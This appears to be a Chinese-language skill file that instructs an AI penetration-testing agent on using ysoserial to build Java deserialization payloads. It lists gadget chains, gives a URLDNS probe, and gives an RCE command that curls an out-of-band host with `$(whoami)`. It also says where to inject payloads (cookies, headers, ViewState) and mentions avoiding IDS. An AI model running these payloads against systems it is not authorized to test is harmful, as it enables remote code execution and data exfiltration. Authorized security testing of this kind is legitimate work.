---
name: ysoserial
category: deserialization
description: Java 反序列化 payload 生成器（不是扫描器）。给定 gadget chain + command → 生成 base64 payload，再用 curl/python3 发到目标。Java app + ObjectInputStream 场景必备。
---

# ysoserial 项目特定约束

## 沙箱环境

- **运行时**：JRE 已装；`/opt/ysoserial.jar` 通过 `/usr/local/bin/ysoserial` 包装脚本调用。
- **网络**：本工具**只生成 payload**，不发请求；发送用 curl/python3。
- **超时**：payload 生成 ~1-3s，几乎瞬时。
- **输出**：默认 stdout 二进制（payload）—— **必管道到 base64/xxd** 再用 curl 发；直接 stdout 给 LLM 看会乱码。

## 项目策略

- **常用 gadget chain（按目标依赖库选）**：
  - `CommonsCollections5` / `CommonsCollections6` —— Apache Commons Collections 3.x
  - `CommonsCollections1` —— Commons Collections + JDK 7u21 以下
  - `CommonsBeanutils1` —— Apache Commons BeanUtils
  - `Spring1` / `Spring2` —— Spring Framework
  - `Hibernate1` —— Hibernate ORM
  - `URLDNS` —— **首选探测用**（无 RCE，仅触发 DNS 查询，配 interactsh-client 验证反序列化点）
- **基本用法**：
  ```sh
  # 探测：URLDNS payload 触发 DNS callback
  ysoserial URLDNS http://abc.oast.fun | base64 -w0
  # 实际 RCE：找出目标用了哪个 chain 后
  ysoserial CommonsCollections5 'curl http://abc.oast.fun/$(whoami)' | base64 -w0
  ```
- **发送**：把 base64 payload 塞 cookie / form param / HTTP header（如 `viewstate`/`__VIEWSTATE`/`Authorization` 等可能触发反序列化的位置）

## 写 finding 红线

发现反序列化点（如 URLDNS payload 触发 interactsh callback）**直接构成 high/critical finding**。`evidence` 必含：
- 注入位置（哪个参数 / header / cookie）
- 完整 payload（`ysoserial <chain> <cmd>` 命令 + 生成的 base64 串前 200 字符）
- 触发证据（interactsh 收到的 DNS/HTTP 请求时间戳 + 完整 unique-id）
- 推断的 gadget chain（从命中模式反推目标用了什么库）

## 决策边界（什么时候**不要**用 ysoserial）

- 目标不是 Java（Python/Node/PHP/Go）→ ysoserial 完全无效，PHP 用 phpggc，Python 用 pickle 手撸
- 没有可疑反序列化点 → 先用 nuclei `cve-*` 模板扫，找到点再上 ysoserial
- 单纯探测 → 用 URLDNS chain，**不要直接上 RCE chain**（合规 + 不触发 IDS）
